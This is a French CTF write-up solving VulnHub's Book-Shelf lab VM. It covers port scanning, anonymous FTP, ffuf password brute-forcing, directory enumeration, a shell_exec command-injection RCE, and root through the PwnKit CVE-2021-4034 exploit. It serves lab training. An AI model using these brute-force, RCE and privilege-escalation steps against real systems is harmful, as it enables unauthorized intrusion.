# Solution du CTF Book-Shelf de VulnHub

On explore les ~~poubelles~~ bas fond de `VulnHub` avec le CTF [Book-Shelf](https://vulnhub.com/entry/book-shelf-1,666/)  qui a été créé par pas moins de 6 personnes ! Wow !

On a la description suivante pour ce CTF :

> "book shelf" is Built On Debian Distribution Includes various beginner to Intermediate level Challenges Based On Web, Networking, Buffer Overflow such as Stegnography, XSS, OS Command Injection , SSH, ftp , Privilege escalation , Fuzzing.

On verra que les mecs ont clairement fumé la moquette XD

Je m'interroge toujours sur le `Buffer Overflow such as Stegnography` ou la présence de deux noms de protocoles placés au milieu de types de vulnérabilités... Ces personnes là comprennent-elles ce qu'elles écrivent ?

```
Nmap scan report for 192.168.56.110
Host is up (0.00020s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            5956 Mar 08  2021 webpass.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 88609f5e7d5fa1eeac2905f4c198a0af (RSA)
|   256 10bdcae7b29dccf45af9d324cd850539 (ECDSA)
|_  256 720ebfb82bf87d657207d45d18a885c6 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Book Shelf
|_http-server-header: Apache/2.4.38 (Debian)
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```

On va voir sur le serveur FTP puisqu'il autorise la connexion anonyme. Là on trouve un fichier texte nommé `webpass.txt` contenant 757 passwords.

On se rend ensuite sur le serveur web qui correspond à un site fictif de librairie spécialisée dans la sécurité informatique.

Sur la page de login, dans le code source, on trouve le commentaire HTML suivant :

```html
<!-- aHR0cHM6Ly9naXRodWIuY29tL3NlYy1iZWhlYWx0aHk=  --> 
```

Soit cette URL :

https://github.com/sec-behealthy

On y trouve (pour résumer) seulement ce contenu :

> Hello username
> 
> Don't think much, it's simple!

Ca laisserait supposer que le nom d'utilisateur à utiliser pour la page de login est `username`

Mais si on tente de bruteforcer le password avec la wordlist donnée :

```bash
ffuf -u http://192.168.56.110/root/log_in/meaco/login.php -X POST \
  -d "uname=username&password=FUZZ&submit=Login" \
  -H "Content-type: application/x-www-form-urlencoded" \
  -w webpass.txt -fs 3989
```

Et bien on n'obtient aucun résultat.

A la racine du site se trouve aussi un fichier `robots.txt` dont voici le contenu :

```
User-agent: * Disallow: /
#Dont Ignore 404! Developer 
#Try Harder  
```

J'ai tenté d'utiiser le login `Developer` sur la page de login, toujours sans succès.

Dans ces situations il n'y a qu'à énumérer encore et encore jusqu'à espérer qu'on trouve ce que les auteurs ont mis en place. J'ai ainsi trouvé différents dossiers sous `/root/log_in` :

```
301        9l       28w      325c http://192.168.56.110/root/log_in/js
301        9l       28w      325c http://192.168.56.110/root/log_in/db
301        9l       28w      328c http://192.168.56.110/root/log_in/admin
301        9l       28w      326c http://192.168.56.110/root/log_in/www
```

Il y avait par exemple ce fichier :

```
302        0l        0w        0c http://192.168.56.110/root/log_in/admin/contact.php
```

Si on s'y rend on est redirigé vers l'URL sur laquelle a été rajouté un paramètre :

```
http://192.168.56.110/root/log_in/admin/contact.php?status=
```

Mais la page ne semble vulnérable qu'à un XSS et aucune automatisation n'est présente pour simuler une victime.

J'ai aussi trouvé cette URL qui ne semblait d'aucune utilité :

```
http://192.168.56.110/root/log_in/admin/fd.php
```

J'ai énuméré toujours plus et j'ai trouvé différents dossiers sous le dossier `images` :

```
301        9l       28w      332c http://192.168.56.110/root/images/os/Images
301        9l       28w      330c http://192.168.56.110/root/images/os/Home
301        9l       28w      335c http://192.168.56.110/root/images/os/Downloads
301        9l       28w      335c http://192.168.56.110/root/images/os/Documents
301        9l       28w      333c http://192.168.56.110/root/images/os/Desktop
```

Et c'est finalement sous le dossier `os` que j'ai trouvé un fichier `feedback.php` qui était intéressant. Voici la commande `feroxbuster` correspondante :

```bash
feroxbuster -u http://192.168.56.110/root/images/os/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt -n
```

Là encore il faut regarder le code HTML pour comprendre :

```html
<html>
<body>

<h3>Page is under construction </h3>
<p>Contact Administrator</p> 
<!-- P3BhdGg9 -->
</body>
</html>
```

Le base 64 se décode en `?path=` mais contrairement à ce qu'on pourrait croire il ne s'agit pas d'une inclusion de fichier mais directement d'une RCE (le script fait un `shell_exec` du paramètre)

Un accès au système plus tard je liste les fichiers qui étaient vraiment présents sous la racine web :

```shellsession
www-data@debian:/var/www/html$ find . -type f | grep -v jpg
./robots.txt
./root/log_in/meaco/login.php
./root/log_in/admin/B00kYouRProFile.php
./root/log_in/admin/fd.php
./root/log_in/admin/contact.php
./root/images/os/feedback.php
./root/images/os/Documents/rce2.txt
./apache2.conf.bkp
./index.html
./index.html.save
```

Donc vraiment pas grand chose de valeur.

Même si le nom d'utilisateur était bien `username`, c'était impossible de se connecter via la wordlist fournie car il y a une typo sur le mot de passe. Ici la lettre `b` de `KeepR3ading@b00ks` est en minuscule alors qu'elle est en majuscule dans la wordlist.

```php
<?php
if (isset($_POST['submit'])){
          $user = $_POST['uname'];
          $pass = $_POST['password'];
          if($user=="username"  &&  $pass=="KeepR3ading@b00ks"){
                  echo("success");
                  echo "<script> window.location.assign('/root/log_in/admin/B00kYouRProFile.php'); </script>";
          }else{
              echo("<h4>wrong Credentials error No user name and password found</h4>");
          }
}
?>
```

Pour l'escalade de privilèges on trouve un binaire setuid et un flag dont l'accès est refusé :

```shellsession
www-data@debian:/home/defender$ find . -type f 2> /dev/null 
./Desktop/.flag3.txt
./.bash_logout
./.ICEauthority
./.profile
./Downloads/.shelf
./.bashrc
./.bash_history
www-data@debian:/home/defender$ file ./Desktop/.flag3.txt ./Downloads/.shelf
./Desktop/.flag3.txt: regular file, no read permission
./Downloads/.shelf:   setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=046c0f68fb4583cf0d53e44e3f066bedea3fbbd8, for GNU/Linux 3.2.0, not stripped
```

Le binaire `.shelf` est setuid mais pour l'utilisateur `defender` :

`-rwsrwxrwx 1 defender defender 16896 Mar  8  2021 /home/defender/Downloads/.shelf`

C'est problématique car dans le code l'argument passé à setuid est `0` (donc `root`) :

```nasm
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000000000001189 <+0>:     endbr64 
   0x000000000000118d <+4>:     push   rbp
   0x000000000000118e <+5>:     mov    rbp,rsp
   0x0000000000001191 <+8>:     mov    edi,0x0
   0x0000000000001196 <+13>:    call   0x1090 <setuid@plt>
   0x000000000000119b <+18>:    mov    edi,0x0
   0x00000000000011a0 <+23>:    call   0x1080 <setgid@plt>
   0x00000000000011a5 <+28>:    lea    rdi,[rip+0xe58]        # 0x2004
   0x00000000000011ac <+35>:    mov    eax,0x0
   0x00000000000011b1 <+40>:    call   0x1070 <system@plt>
   0x00000000000011b6 <+45>:    nop
   0x00000000000011b7 <+46>:    pop    rbp
   0x00000000000011b8 <+47>:    ret    
End of assembler dump.
```

Du coup l'appel échoue, le binaire ne peux pas fonctionner.

Comme j'ai pu le dire sur d'autres CTFs, écraser un binaire setuid retire son bit donc impossible de rectifier l'appel à setuid :

```shellsession
www-data@debian:/home/defender/Downloads$ ls -al .shelf
-rwsrwxrwx  1 defender defender 16896 Mar  8  2021 .shelf
www-data@debian:/home/defender/Downloads$ which id
/usr/bin/id
www-data@debian:/home/defender/Downloads$ cat /usr/bin/id > .shelf
www-data@debian:/home/defender/Downloads$ ls -al .shelf 
-rwxrwxrwx 1 defender defender 43808 Feb 19 02:53 .shelf
```

Pour passer root on peut heureusement compter sur l'exploit `PwnKit` pour la `CVE-2021-4034` :

```shellsession
www-data@debian:/tmp$ ./PwnKit 
root@debian:/tmp# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@debian:/tmp# cd /root
root@debian:~# ls
root.txt
root@debian:~# cat root.txt
Congratulations on Getting Root Privileges!

book4["4cyber_sec_kevin4"]

This CTF is made by Securium Solutions Pvt Ltd!
Authors:
Sunil Singh
Neha Singh
Pallab Jyoti Borah
Vishal Thakur
Shubham Jaiswal
Sam Nivethan V J

See you with Another one :)
```

Six auteurs pour créer ce CTF et aucun n'a visiblement vérifié que ça fonctionnait correctement...

*Publié le 18 février 2023*
